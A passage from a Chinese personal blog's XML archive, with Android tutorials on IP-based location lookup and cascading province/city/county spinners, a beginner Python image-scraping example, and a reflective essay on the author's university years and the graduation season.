&#123; // TODO Auto-generated catch block e.printStackTrace(); &#125; System.out.println(response); &#125; &#125;);&#125; 执行请求在mIpHandler接收到ip地址后，再调用获取定位信息的Http方法（即在mIpHandler的handleMessage方法的最后加入下面这行代码） 1IpHttpUtil.getAddress(mCityHandler, res); //发送获取定位信息的http请求 效果展示我们在获取ip地址那篇博客的例子的基础上增加了一个TextView来显示本篇博客获取的定位信息，如下图所示，我们获取并显示了得到的JSON格式的返回数据，即通过该ip地址获得的定位信息。如下图所示，我们可以看到已经获得了服务器返回的JSON数据，但是可以很清楚的看到，显示的unicode编码，并不是汉字，那就需要将接收到的数据转化成汉字咯。 在网上摘抄了一段unicode转汉字的代码： 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465private String decodeUnicode(String theString) &#123; char aChar; int len = theString.length(); StringBuffer outBuffer = new StringBuffer(len); for (int x = 0; x &amp;lt; len;) &#123; aChar = theString.charAt(x++); if (aChar == &apos;\\&apos;) &#123; aChar = theString.charAt(x++); if (aChar == &apos;u&apos;) &#123; // Read the xxxx int value = 0; for (int i = 0; i &amp;lt; 4; i++) &#123; aChar = theString.charAt(x++); switch (aChar) &#123; case &apos;0&apos;: case &apos;1&apos;: case &apos;2&apos;: case &apos;3&apos;: case &apos;4&apos;: case &apos;5&apos;: case &apos;6&apos;: case &apos;7&apos;: case &apos;8&apos;: case &apos;9&apos;: value = (value &amp;lt;&amp;lt; 4) + aChar - &apos;0&apos;; break; case &apos;a&apos;: case &apos;b&apos;: case &apos;c&apos;: case &apos;d&apos;: case &apos;e&apos;: case &apos;f&apos;: value = (value &amp;lt;&amp;lt; 4) + 10 + aChar - &apos;a&apos;; break; case &apos;A&apos;: case &apos;B&apos;: case &apos;C&apos;: case &apos;D&apos;: case &apos;E&apos;: case &apos;F&apos;: value = (value &amp;lt;&amp;lt; 4) + 10 + aChar - &apos;A&apos;; break; default: throw new IllegalArgumentException( &quot;Malformed \\uxxxx encoding.&quot;); &#125; &#125; outBuffer.append((char) value); &#125; else &#123; if (aChar == &apos;t&apos;) aChar = &apos;\t&apos;; else if (aChar == &apos;r&apos;) aChar = &apos;\r&apos;; else if (aChar == &apos;n&apos;) aChar = &apos;\n&apos;; else if (aChar == &apos;f&apos;) aChar = &apos;\f&apos;; outBuffer.append(aChar); &#125; &#125; else outBuffer.append(aChar); &#125; return outBuffer.toString(); &#125; 使用此方法将接收到的字符处理后即可获得获得汉字显示，如下图：]]></content>
      <categories>
        <category>Android</category>
      </categories>
      <tags>
        <tag>［Android,ip］</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Android获取外网ip地址详解]]></title>
    <url>%2F2016%2F07%2F10%2FAndroid%E8%8E%B7%E5%8F%96%E5%A4%96%E7%BD%91ip%E5%9C%B0%E5%9D%80%E8%AF%A6%E8%A7%A3%2F</url>
    <content type="text"><![CDATA[很多App都需要获取当前所在位置，如果需要获取精确地位置当然是使用GPS定位啦，但是有时候不需要那么精确的定位，而且手机开启GPS进行定位需要用户手动打开GPS开关，那么如何无声无息的在后台进行定位呢？其实，只要获取到本机的外网ip地址就能够获取你的所在大概地址啦！此篇博客主要讲解如何获取外网ip，如何通过ip进行定位将写在下一篇博客中。 获取外网ip地址实现方法想必很多人都查过本机的外网ip地址，通过cmd的config等命令看到的都是内网ip，要想查看外网ip有一个很简单的办法就是在百度输入ip，点击搜索即可看到自己的外网ip，这个结果通常是由www.ip138.com这个网站提供的，我们点进去可以看到他其实提供了ip地址查询服务。那我们就可以把这个利用起来，这里其实会用到类似爬虫的技术，也就是把网页源代码下下来，然后从源代码中提取ip地址。打开浏览器的开发者工具，定位ip地址那一行代码，可以看到如下代码： 我们对http://1212.ip138.com/ic.asp发送一个get请求即可获得服务器返回的ip地址信息。 android-async-http在AndroidManifest.xml文件中加入如下：1&lt;uses-permission android:name=&quot;android.permission.INTERNET&quot; /&gt; jar包下载点击此处可以下载第三方网络请求库：android-async-http的jar包 将jar包添加到工程将jar包复制到lib文件夹下，并右键该jar包，点击BuildPath，然后点击Add to Build Path。 获取网站返回信息对http://1212.ip138.com/ic.asp发送一个get请求来获得服务器返回的ip地址信息。 123456789101112131415161718192021222324252627282930public class IpHttpUtil &#123; public static void GetNetIp(final Handler handler, String url) &#123; AsyncHttpClient client = new AsyncHttpClient(); client.get(url, new AsyncHttpResponseHandler() &#123; @Override public void onSuccess(int arg0, Header[] arg1, byte[] bytes) &#123; // TODO Auto-generated method stub String ipLine = null; String response = null; try &#123; //字节转字符串，并指定编码方式为GBK，否则会乱码 response = new String(bytes, &quot;GBK&quot;); &#125; catch (UnsupportedEncodingException e) &#123; // TODO Auto-generated catch block e.printStackTrace(); &#125; System.out.println(&quot;返回的信息&quot; + response); //打印返回信息 &#125; @Override public void onFailure(int arg0, Header[] arg1, byte[] bytes, Throwable arg3) &#123; // TODO Auto-generated method stub String response = new String(bytes); System.out.println(response); &#125; &#125;); &#125;&#125; 返回信息如下： Java正则表达式取出字符串我们要从网站返回的html中提取ip地址则可以通过正则表达式来进行匹配： 提取中括号内容的规则：\[.*\]，对Http请求得到的response进行正则匹配，得到字符串：[xxx.xxx.xxx.xxx]，然后再进行字符串切割，取出ip地址。 1234567891011//匹配中括号及其之间的内容Pattern pattern = Pattern.compile(&quot;\\[.*\\]&quot;); Matcher matcher = pattern.matcher(response.toString());if (matcher.find()) &#123; ipLine = matcher.group();&#125;if(!ipLine.isEmpty())&#123; //去掉左右两边的中括号 ipLine = ipLine.substring(1, ipLine.length() - 1); &#125;System.out.println(&quot;ip地址：&quot; + ipLine); 将获取到的数据通过Handler传回到Activity：1234//将得到的ip地址传递给Activity进行显示Message msg = new Message();msg.obj = ipLine;handler.sendMessage(msg); 在Activity中调用Http请求：1234567891011121314151617181920212223242526public class MainActivity extends Activity &#123; private TextView mName, mIp; private Handler mIpHandler = new Handler() &#123; public void handleMessage(Message msg) &#123; String res = (String) msg.obj; //取出通过Handler传递过来的字符串 System.out.println(&quot;MainActivity:&quot; + res); mIp.setText(res); //显示到界面 &#125;; &#125;; @Override protected void onCreate(Bundle savedInstanceState) &#123; super.onCreate(savedInstanceState); setContentView(R.layout.activity_main); mName = (TextView) findViewById(R.id.tv_name); mIp = (TextView) findViewById(R.id.tv_ip); mName.setText(&quot;你的外网ip地址是：&quot;); //发送Http请求 String url = &quot;http://1212.ip138.com/ic.asp&quot;; IpHttpUtil.GetNetIp(mIpHandler, url); &#125;&#125; 效果展示 获取了本机的外网ip之后就可以通过这个ip来进行定位啦！欲知后事如何，请看下回分解！]]></content>
      <categories>
        <category>Android</category>
      </categories>
      <tags>
        <tag>［Android,ip］</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Python爬虫基础-正则表达式与Http请求]]></title>
    <url>%2F2016%2F07%2F03%2FPython%E7%88%AC%E8%99%AB%E5%9F%BA%E7%A1%80-%E6%AD%A3%E5%88%99%E8%A1%A8%E8%BE%BE%E5%BC%8F%E4%B8%8EHttp%E8%AF%B7%E6%B1%82%2F</url>
    <content type="text"><![CDATA[网络爬虫又称为网络机器人，它可以按照程序设定的规则自动抓取网页上的信息。网络是信息的海洋，但是网络中的数据是零散的、无序的且存在着冗余，如何从复杂的网页代码中提取有用的信息便是爬虫需要解决的问题。Python语法简洁，代码风骚，数据的处理能力强，比如函数参数的打包解包，列表解析，矩阵处理，非常方便，所以Python非常适合做网络爬虫。我将在这里很大家分享我的一些网络爬虫小程序，让我们一起体验爬虫带来的乐趣吧！ 基本正则表达式Python正则表达式模块：re模块 导入re模块：1import re python通过re模块提供对正则表达式的支持。 常用方法findall： 匹配所有符合规律的内容，返回包含结果的列表 Search：匹配并提取第一个符合规律的内容，返回一个正则表达式对象（object) Sub：替换符合规律的内容，返回替换后的值 常用符号，，问号与括号 点号. : 匹配任意字符，换行符\n除外 星号* ：匹配前一个字符0次或无限次 问号? ：匹配前一个字符0次或1次 贪心算法：.* 非贪心算法：.*? 括号（）：括号内的数据作为结果返回 常用情况使用findall与search从大量文本中匹配感兴趣的内容 使用sub实现换页功能 Http网络请求requests模块 Requests 是用Python语言编写，基于 urllib，采用 Apache2 Licensed 开源协议的 HTTP 库。它比 urllib 更加方便，可以节约我们大量的工作，完全满足 HTTP 测试需求。 导入requests模块1import requests 基本Get请求12345#-*- coding:utf-8 -*- //定义编码为utf-8，避免显示乱码import requestsurl = &apos;http://www.baidu.com&apos; r = requests.get(url) //使用requests模块的get方法获取百度首页的源代码print r.text 这里只举例了我们要使用的基本的get请求，如果需要了解更多的requests模块的方法请自行百度。 实例代码目的：爬取湖南农业大学官网中心位置的三张图片，并且下载下来 获取图片的源代码使用chrome打开农大官网，右键审查元素，然后点击左上角的放大镜，点击图片就会定位到图片的源代码位置，如图所示： 分析源代码，写出正则表达式分析上图可知，我们需要的部分为src=””中引号里面的url，而三张图片都是相同的格式，所以我们使用re模块的findall方法，将src的中间部分获取到即可：re.findall(‘img src=”(.?)” width=”990”‘,html.text,re.S)（1）findall即匹配所有符合正则表达式规则的内容（2）(.?)用作获取src=””的双引号中间的url并返回（3）re.S的作用是使.的作用范围包括换行符，即可以换行匹配 根据获取到的url下载图片因为我们获取到的url并不是完整的网址，所以右键上图的链接选择Open link in new tab来查看完整的网址，如下图，因此我们在下载图片时需要在url前加上http://www.hunau.edu.cn/。 代码如下：123456789101112131415161718import re //导入正则表达式的库import requests //导入第三方http库html = requests.get(&quot;http://www.hunau.edu.cn/&quot;) //通过get方法获取农大官网的网页源代码html.encoding = &apos;utf-8&apos; //设定编码方式，使能够正常显示中文# print(html.text) //也可以把网页源代码输出来看一下homedir = os.getcwd() //获取项目当前路径os.mkdir(homedir+&apos;\pic&apos;) //创建pic文件夹，用于保存图片pic_url = re.findall(&apos;img src=&quot;(.*?)&quot; width=&quot;990&quot;&apos;,html.text,re.S) //设定正则表达式，爬取图片的urli = 0for each in pic_url: //遍历pic_url print &apos;now downloading:&apos; + each pic = requests.get(&quot;http://www.hunau.edu.cn/&quot;+each) //补充完整的网址，通过get方法获取图片 fp = open(&apos;pic\\&apos; + str(i) + &apos;.jpg&apos;,&apos;wb&apos;) //在pic文件夹下创建jpg格式的文件 fp.write(pic.content) //将图片写入到工程文件夹下的pic文件夹中 fp.close() i += 1 文本爬虫，效果如下： 我们在这里只是爬取了三张图片，但是使用python来做网页爬虫真的功能很强大，大家可以试一试修改代码去爬取更多的图片。]]></content>
      <categories>
        <category>Programming language</category>
        <category>Python</category>
      </categories>
      <tags>
        <tag>Python</tag>
        <tag>Http</tag>
        <tag>正则表达式</tag>
        <tag>爬虫</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Android Spinner控件之省市区（县）三级联动]]></title>
    <url>%2F2016%2F07%2F01%2FAndroid-Spinner%E6%8E%A7%E4%BB%B6%E4%B9%8B%E7%9C%81%E5%B8%82%E5%8C%BA%EF%BC%88%E5%8E%BF%EF%BC%89%E4%B8%89%E7%BA%A7%E8%81%94%E5%8A%A8%2F</url>
    <content type="text"><![CDATA[使用Spinner控件实现省市区三级联动在很多地方都需要用到，比如用户个人信息填写、快递地址填写等场景，这是一个比较基本的功能，但是实现起来却有点麻烦，因为要加载很多的资源数组。掌握基本的省市区三级联动很有必要，当然，再加上一些酷炫的UI设计就能更nice。 布局文件添加三个Spinner控件，分别用于省、市、区（县）： 1234567891011121314151617181920212223242526272829303132&lt;LinearLayout xmlns:android=&quot;http://schemas.android.com/apk/res/android&quot; android:layout_width=&quot;match_parent&quot; android:layout_height=&quot;match_parent&quot; android:orientation=&quot;horizontal&quot; &gt; &lt;Spinner android:id=&quot;@+id/spinner_province&quot; android:layout_width=&quot;0dp&quot; android:layout_height=&quot;wrap_content&quot; android:layout_marginTop=&quot;10dp&quot; android:layout_weight=&quot;1.2&quot; &gt; &lt;/Spinner&gt; &lt;Spinner android:id=&quot;@+id/spinner_city&quot; android:layout_width=&quot;0dp&quot; android:layout_height=&quot;wrap_content&quot; android:layout_marginLeft=&quot;4dp&quot; android:layout_marginTop=&quot;10dp&quot; android:layout_weight=&quot;1.2&quot; &gt; &lt;/Spinner&gt; &lt;Spinner android:id=&quot;@+id/spinner_county&quot; android:layout_width=&quot;0dp&quot; android:layout_height=&quot;wrap_content&quot; android:layout_marginLeft=&quot;4dp&quot; android:layout_marginTop=&quot;10dp&quot; android:layout_weight=&quot;1.8&quot; &gt; &lt;/Spinner&gt;&lt;/LinearLayout&gt; 逻辑实现实现原理：为每一个Spinner添加监听，选择省份后加载该省份的市区（县）数组资源，选择市之后加载该市对应的区（县）数组资源，从而实现三级联动。 代码有点多，这里只贴了核心代码，资源数组与定义的资源数组ID数组都没有写出来了，目前博客的下载插件还没弄好，暂时无法提供下载，，如果需要源码可以联系我联系方式在主页可看到。 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172173174175176177178179180181182183184185186187188189190191192193194195196197198199200201202203204205206207208209210211212213214215216217218219220221222223224225226227228229230231232233234235236237238239240241242243244245246247248249250251252253254255256257258259260261262263264265266267268269270271272273274275276277278279280281282283284285286287288289290291292293294public class MainActivity extends Activity &#123; private Spinner mProvinceSpinner, mCitySpinner, mCountySpinner; private ArrayAdapter&lt;CharSequence&gt; mProvinceAdapter, mCityAdpater, mCountyAdapter; private int mProvinceId, mCityId; private String mProvinceName, mCityName, mCountyName; @Override protected void onCreate(Bundle savedInstanceState) &#123; super.onCreate(savedInstanceState); setContentView(R.layout.activity_main); mProvinceSpinner = (Spinner) findViewById(R.id.spinner_province); mCitySpinner = (Spinner) findViewById(R.id.spinner_city); mCountySpinner = (Spinner) findViewById(R.id.spinner_county); // 省份选择 mProvinceAdapter = ArrayAdapter.createFromResource(this, R.array.province_item, android.R.layout.simple_spinner_item); mProvinceAdapter .setDropDownViewResource(android.R.layout.simple_spinner_dropdown_item); mProvinceSpinner.setAdapter(mProvinceAdapter); mProvinceSpinner .setOnItemSelectedListener(new OnItemSelectedListener() &#123; @Override public void onItemSelected(AdapterView&lt;?&gt; arg0, View arg1, int arg2, long arg3) &#123; // TODO Auto-generated method stub // 获取省的ID mProvinceId = mProvinceSpinner .getSelectedItemPosition(); // 获取省的名字 mProvinceName = mProvinceSpinner.getSelectedItem() .toString(); // 市选择 SpinnerBindResource(mCitySpinner, mCityAdpater, city[mProvinceId]); mCitySpinner .setOnItemSelectedListener(new OnItemSelectedListener() &#123; @Override public void onItemSelected( AdapterView&lt;?&gt; arg0, View arg1, int arg2, long arg3) &#123; // TODO Auto-generated method stub // 获取市的ID mCityId = mCitySpinner .getSelectedItemPosition(); // 获取市的名字 mCityName = mCitySpinner .getSelectedItem().toString(); // 县选择 switch (mProvinceId) &#123; case 0: SpinnerBindResource(mCountySpinner, mCountyAdapter, countyOfBeiJing[mCityId]); break; case 1: SpinnerBindResource(mCountySpinner, mCountyAdapter, countyOfTianJing[mCityId]); break; case 2: SpinnerBindResource(mCountySpinner, mCountyAdapter, countyOfHeBei[mCityId]); break; case 3: SpinnerBindResource(mCountySpinner, mCountyAdapter, countyOfShanXi1[mCityId]); break; case 4: SpinnerBindResource(mCountySpinner, mCountyAdapter, countyOfNeiMengGu[mCityId]); break; case 5: SpinnerBindResource(mCountySpinner, mCountyAdapter, countyOfLiaoNing[mCityId]); break; case 6: SpinnerBindResource(mCountySpinner, mCountyAdapter, countyOfJiLin[mCityId]); break; case 7: SpinnerBindResource( mCountySpinner, mCountyAdapter, countyOfHeiLongJiang[mCityId]); break; case 8: SpinnerBindResource(mCountySpinner, mCountyAdapter, countyOfShangHai[mCityId]); break; case 9: SpinnerBindResource(mCountySpinner, mCountyAdapter, countyOfJiangSu[mCityId]); break; case 10: SpinnerBindResource(mCountySpinner, mCountyAdapter, countyOfZheJiang[mCityId]); break; case 11: SpinnerBindResource(mCountySpinner, mCountyAdapter, countyOfAnHui[mCityId]); break; case 12: SpinnerBindResource(mCountySpinner, mCountyAdapter, countyOfFuJian[mCityId]); break; case 13: SpinnerBindResource(mCountySpinner, mCountyAdapter, countyOfJiangXi[mCityId]); break; case 14: SpinnerBindResource(mCountySpinner, mCountyAdapter, countyOfShanDong[mCityId]); break; case 15: SpinnerBindResource(mCountySpinner, mCountyAdapter, countyOfHeNan[mCityId]); break; case 16: SpinnerBindResource(mCountySpinner, mCountyAdapter, countyOfHuBei[mCityId]); break; case 17: SpinnerBindResource(mCountySpinner, mCountyAdapter, countyOfHuNan[mCityId]); break; case 18: SpinnerBindResource(mCountySpinner, mCountyAdapter, countyOfGuangDong[mCityId]); break; case 19: SpinnerBindResource(mCountySpinner, mCountyAdapter, countyOfGuangXi[mCityId]); break; case 20: SpinnerBindResource(mCountySpinner, mCountyAdapter, countyOfHaiNan[mCityId]); break; case 21: SpinnerBindResource(mCountySpinner, mCountyAdapter, countyOfChongQing[mCityId]); break; case 22: SpinnerBindResource(mCountySpinner, mCountyAdapter, countyOfSiChuan[mCityId]); break; case 23: SpinnerBindResource(mCountySpinner, mCountyAdapter, countyOfGuiZhou[mCityId]); break; case 24: SpinnerBindResource(mCountySpinner, mCountyAdapter, countyOfYunNan[mCityId]); break; case 25: SpinnerBindResource(mCountySpinner, mCountyAdapter, countyOfXiZang[mCityId]); break; case 26: SpinnerBindResource(mCountySpinner, mCountyAdapter, countyOfShanXi2[mCityId]); break; case 27: SpinnerBindResource(mCountySpinner, mCountyAdapter, countyOfGanSu[mCityId]); break; case 28: SpinnerBindResource(mCountySpinner, mCountyAdapter, countyOfQingHai[mCityId]); break; case 29: SpinnerBindResource(mCountySpinner, mCountyAdapter, countyOfNingXia[mCityId]); break; case 30: SpinnerBindResource(mCountySpinner, mCountyAdapter, countyOfXinJiang[mCityId]); break; case 31: SpinnerBindResource(mCountySpinner, mCountyAdapter, countyOfHongKong[mCityId]); break; case 32: SpinnerBindResource(mCountySpinner, mCountyAdapter, countyOfAoMen[mCityId]); break; case 33: SpinnerBindResource(mCountySpinner, mCountyAdapter, countyOfTaiWan[mCityId]); break; default: break; &#125; mCountySpinner .setOnItemSelectedListener(new OnItemSelectedListener() &#123; @Override public void onItemSelected( AdapterView&lt;?&gt; arg0, View arg1, int arg2, long arg3) &#123; // TODO Auto-generated // method stub mCountyName = mCountySpinner .getSelectedItem() .toString(); Toast.makeText( MainActivity.this, &quot;你选择的是：&quot; + mProvinceName + &quot;-&quot; + mCityName + &quot;-&quot; + mCountyName, Toast.LENGTH_SHORT) .show(); &#125; @Override public void onNothingSelected( AdapterView&lt;?&gt; arg0) &#123; // TODO Auto-generated // method stub &#125; &#125;); &#125; @Override public void onNothingSelected( AdapterView&lt;?&gt; arg0) &#123; // TODO Auto-generated method stub &#125; &#125;); &#125; @Override public void onNothingSelected(AdapterView&lt;?&gt; arg0) &#123; // TODO Auto-generated method stub &#125; &#125;); &#125; // 数据绑定 public void SpinnerBindResource(Spinner spinner, ArrayAdapter&lt;CharSequence&gt; adapter, int arrayId) &#123; adapter = ArrayAdapter.createFromResource(this, arrayId, android.R.layout.simple_spinner_item); adapter.setDropDownViewResource(android.R.layout.simple_spinner_dropdown_item); spinner.setAdapter(adapter); &#125;&#125; 效果展示 注：如果需要源码可以联系我，联系方式在主页可看到。]]></content>
      <categories>
        <category>Android</category>
      </categories>
      <tags>
        <tag>［Android,Spinner］</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[六月，毕业季---感恩有你]]></title>
    <url>%2F2016%2F07%2F01%2F%E5%85%AD%E6%9C%88%EF%BC%8C%E6%AF%95%E4%B8%9A%E5%AD%A3-%E6%84%9F%E6%81%A9%E6%9C%89%E4%BD%A0%2F</url>
    <content type="text"><![CDATA[都说毕业遥遥无期，转眼就要各奔东西。又到毕业季，从在外实习的学长学姐回到学校，到学长学姐忙毕业论文，再到好多的送别宴，到最后的毕业典礼，到离别，这一段时间感触很多，但是一直没有记录下来，现在是时候写一写了。虽然不是我自己毕业了，但是还是有很多很多感触。毕竟是最亲的一届学长学姐，很多很亲近很熟悉的人就要离开了，说不定以后也很难再相见，也因为过完这个学期就是准大四学生了，一年后就是我们的毕业。 毕业典礼的第二天，蚯蚓学姐离开了学校，也是那天，算是大学最后一门正正规规的课，最后一次课程设计答辩也结束了。那天，答辩完，下楼就碰到了我们的助班学姐，她马上就要离校，匆匆忙忙拍了一张合照。突然觉得好伤感，学长学姐毕业，我们大学基本的课程结束，真的有很多很多要想说的话。 大一报道是一个人来的学校，从高铁站坐的农大校车到修业广场，来到这个陌生的地方，是助班学姐和一位学长帮我提行李，送我到寝室去的。一路上学姐给我各种介绍，特别清楚记得图书馆西边的小坡有几个由小树修剪成的校训：朴诚、奋勉、求实、创新，时至今日，我依然牢记。之后的军训，对于不常锻炼的我来说确实比较艰难，但是因为有大家一起，也因为有助班学长学姐的关心，我才坚持下来。不能说军训有多么多么的值得怀恋，毕竟我不是特别喜欢军训的人，但是记得有句话：所有的事情都有他存在的意义。或许也是军训这段时间让给我们懂得吃苦耐劳，结奋斗吧！军训结束，班级聚餐，大家各种喝酒，也于是大家慢慢熟悉起来。 国庆之后，随着大学正式开课、学生会招新等，我的大学生活也真正开始了。先说说组织部吧，我爱了三年的部门。我的助班蚯蚓学姐是我的部长，在这个部门她教给我很多的东西，最重要的应该是为人处世，有些东西真的就是耳濡目染，慢慢的会领悟很多。组织部的常规活动就是民主生活会了，说不出什么特别的地方，每两周一次的活动，组织部是作为检查打分的角色出现的，一开始还很有兴致，但是慢慢的也就觉得没什么意思了，然后还有一些比如收团费、团干培训等等事情，其实很多事情都是部长副部帮我们做了，只怪学姐们太能干，哈哈。最开心的当然还是部长带我们出去浪吧，去吃饭唱歌，记得部门最后一次是在市里的，在湘江边吃的饭，然后去唱了晚晚场，很开心，也很难忘。大一下学期，从懵懂的小屁孩也开始懂得了一些事情，一届学生会结束，昔日一起做事一起玩耍的小伙伴以后就很难有这样的机会了。 生活部的话，我的部长虎哥，副部诚哥、兰姐都对我很好。当干事的一年里，也是没什么特别的地方，每周一早上去早检，也就是叫学长学姐起床，然后检查宿舍卫生，还是很佩服自己大一的时候，也是从那时候培养的一种精神吧，冬天的早检是很痛苦的，天还没亮就要出发，但是不管多么冷，我都可以坚持从芷兰到金岸去早检。一直觉得生活部还是挺温馨的，有一个热心的部长，然后人也很多，经常能聚聚餐，喝酒也算是常态了，也有喝醉的时候，但是还是很开心，毕竟大家像一个温馨的大家庭。虽然可能到现在很多人都已经不熟悉了，但是至少大家以前都在生活部待过，都有过这段美好的回忆。 大一下学期，在图书馆大成厅，实验室招新宣讲会。学院几大实验室的指导老师都来宣传自己的实验室，曾炼成老师结合之前实验室的一些作品宣传了电子设计创新实验室，就在那时，我觉得这就是我要去的地方。现在回想起来，其实很多事情真的就是一种缘分，说不上什么很特别的理由。会后，我给曾老师打了电话表达了我想要加入电子设计创新实验室的想法，然后他让我找陈刚老师，再然后陈老师让我去找欧超学长，就这样，没有面试没有考核就这样进来啦。进来以后才知道，原来这个实验室已经很久没人管了，但是还是有一批学长学姐在这里学技术。虽然和想象的有区别也有点失望，但是欧超学长的热情与真诚打动了我，也是他带着我从零开始学习单片机，带我去图书馆找资料，给我拷视频资料，拿单片机开发板给我用，后来还给了我实验室的钥匙。经过一段时间的学习，我对单片机已经有了大体的一些了解，也开始真正了解大学应该学些什么。现在回想起来，其实当时的这一步对我来说真的非常重要，没有这些经历，我也不会这么快懂得要学习什么，怎么学习。 大二期间，担任班长、院学生会组织部副部长。其实，在开始的竞选中发生了很多不愉快的事情，但是还好最后的结果大家都还算满意。这一年里，班长、院学生会组织部副部长两个职务，也是对自己全新的挑战吧。作为班长，我想尽各种办法让班上同学能够认真学习专业知识，积极联系老师，积极开展导师制，积极完成学工老师交代的任务，积极带领班上同学搞活动、搞学习，一年下来，感觉很多事情都白做了，自己收获的很多，但是班级并没有很大的改观。其实，真的，大学关键还是靠自己，自己不动，别人怎么给你想办法都没用。作为组织部的副部长，积极配合我的部长的工作，带领几个小干事一起干活。天才第一步，进我组织部，这是蚯蚓学姐为组织部想的宣传语，沿用至今。很庆幸能够在组织部遇到这群人，我的领导善解人意、办事能力强，几位小干事也都很听话，感觉就是一个温馨的大家庭。现在看到他们越来越好我也是很开心的，毕竟我们永远是一家人。很遗憾的是我们部门在这个毕业季没能和我们上届的部长，也就是蚯蚓学姐吃一顿饭了，学姐真的是太忙了，档期安排的满满的，到最后也没找到机会一起。 也是在大二，我慢慢的开始适应实验室的环境，它没有图书馆压抑的气氛，在这里我们动手做实验，学习电子设计方面的知识，思维可以放得很开，网络也很方便，可以迅速的查阅资料，在这里我获得了前所未有的信息量，很大程度上开阔了视野。欧超、杨勇锋等几位学长策划着建立一个电子协会，也开始带着手实验室的招新工作。这一年，实验室招了30个13级学生，几位学长负责每周为我们讲课，因为这个平台我和后来一起带实验室和协会的搭档尹远和张涛开始熟知。也是这一年实验室获得了不错的发展，有了电子协会这个宣传的平台，实验室也开始被学弟学妹们所了解。学长们乐于奉献的精神也给我很大的影响，也是我接手实验室之后一直努力想把实验室建设好的原因吧，希望这种精神能够延续下去。同时，由于大二的数据结构课程，卧铺有幸认识了我的恩师戴教授，并开始在他的指导下接触科研。他是一个个踏踏实实搞教学和科研的人，他认真严谨的态度一直感染着我，也是他带着我写论文、学安卓、玩树莓派、报科创项目，能够耐心的听我讲我最新了解到的知识，和我一起聊技术方面的事情，也时常给我推荐各种书籍和资料。其实，让我最感动的还是他的倾听，因为在大学里很多教授都是很难见到的，但是每次他都能耐心的听我讲完并给我一些建议，在技术上算是一个知己吧。很多次在他办公室看到他在学习新的知识，也会看到他为了备课经常下载更多的资料以及自己看慕课来完善自己的课堂，这些在我看来都是很难得的。他的不断学习的意识以及认真严谨的学术态度让我很佩服，所以我也愿意一直跟着他学习，希望以后能成为像他这样优秀的人。 大三开始，真正接手实验室。说实话，一开始真的很无助，以前都是超哥和锋哥担当起很多的责任，实验室、协会上课都是他们在负责，但是他们已经去深圳参加嵌入式的培训了，剩下维哥也在学校准备找工作去实习了，不知道怎么办。不过，还好，上天总是眷顾努力的人们，就在这时候匡老师来了，她要来带一带实验室，匡老师的热情与真诚让我看到了希望，之后的很多事情很多安排都是她在做，包括实验室的规划、指导老师的调动等。于是，我也有了信心，在没有什么带过学弟学妹的经验的情况下，我平时积极学习，每周都积极备课，希望大家来了就能有收获，也邀请了维哥、能神来给大家讲课，总的来说，虽然我讲课确实讲得不好，讲得快，没有意识到大家是否听懂，但是至少在我带的这段时间，很多安排都在井井有条的进行，自我感觉还是很有希望的，实验室的学习气氛还是获得了其他老师的认可，也是因为大三上学期的积累，大三下学期的蓝桥杯才能取得不错的成绩。为了蓝桥杯，我确实付出了很多，画板子、调板子、再到安排大家焊接，已经之后各个模块的熟悉，确实花了很多时间。当初，毫无保留的把自己学会的与大家分享，也是希望大家都能在比赛中获得好的成绩。还好，我的付出也算有了回报，努力的人们都取得了不错的成绩，我自己也拿了省一等奖，获得去北京参加决赛的机会。去北京的经历已经很详细的记录在另一篇博客了，这里就略过吧。这其中也还是很感谢实验室各位老师的辛勤付出吧，特别是匡老师和陈老师，一个负责组织，一个负责技术，也挺好的啦！有时候，回想起来，这一段路有心酸、有泪水也有感动吧，当你一个人默默付出的时候，别人可能并不知道，但是在收获的时候你一定是最幸福的。 最近想尽办法让自己静下来好好复习，也买了很多书准备看看。这学期真的忙了很多的事情，一直想参加更多的比赛，想拿更多的奖，但是到头来发现过程中的收获比结果重要很多，虽然在有时候我们不得不拿出些奖励来获得别人的认可，但是我现在更希望自己具备真正的实力。不积跬步，无以至千里，不积小流，无以成江海，与其参加更多意义并不大的比赛，还不如静下来好好学知识学技术，这样不管对于找工作还是考研都是很有帮助的。到现在，很多事情都不想去做了，只想安安静静的复习考研，所以7月在武汉的的智能互联大学分赛区决赛我也不准备去了。为了让自己能够静下来好好复习我也确实放弃了很多东西，有时候也会觉得比较无奈吧。如果让我说大学三年来最大的遗憾是什么，我认为应该是我在大学没有找到一个好的团队，不是说怪队友怎么怎么，而是真的没有几个一起并肩奋斗的人，很多时候都是自己一个人在战斗，好几次比赛都是自己找的人，别人还不太乐意，团队没有共同的明确目标那很难走下去，有时候很绝望的是你想去做一个项目，别人却总是有各种事情，所以到现在我也慢慢明白了，确实大家都有各自的事情要忙，没有共同的目标又何苦要求别人一起来呢，这应该是我最近认识的最深刻的问题了。我是一个常常喜欢反思自己、思考问题的人，只是很多时候我并不喜欢表达出来，在别人看来这或许是我的缺点吧，但是有些想法确实不能说。 倒是还是很担心实验室，毕竟大家花了那么多心思才让实验室有一点起色，我不想让这一点点希望就这样没了，现在的情况让我很担忧，老师没时间来，学生也忙自己的事情，不主动，大概很久都没有听到实验室的动静了。有时候就是有那么一点点好强，总是去和其他实验室比较，看到这样的现状感觉很不爽，但是自己又不能改变什么。这两年真的把实验室当成了自己大学里的一个家了，在这里的成长与感动让我觉得大学过得很充实也很踏实，虽然不能在这里待一辈子，但是还是希望这个实验室能够越来越好。六月就这样结束了，大学前三年也就这样结束了，七月已经到来，现在的我只想好好复习准备考研或者找份好工作啦。 大学三年，只因有你们，我的大学生活才不平凡，感恩有你。虽然对这个地方还是有很多的不满，但是自己也在这里成长了三年，再多的抱怨也埋在心底好了。毕竟，我们的成长更多的是靠自己。大四，新的未来。学长学姐都毕业了，我们已经成为最老的老油条，慢慢的自己也获得了成长，但是每一次与学长学姐交流，都可以有新的收获，不管是对未来的一些了解，还是对自己现状的一些反思，我觉得虽然可能就是一次简单的聊天，但也可以对你产生一些无形的影响。最后，祝各位毕业的学长学姐前程似锦，以后有机会再相聚！]]></content>
      <categories>
        <category>Life</category>
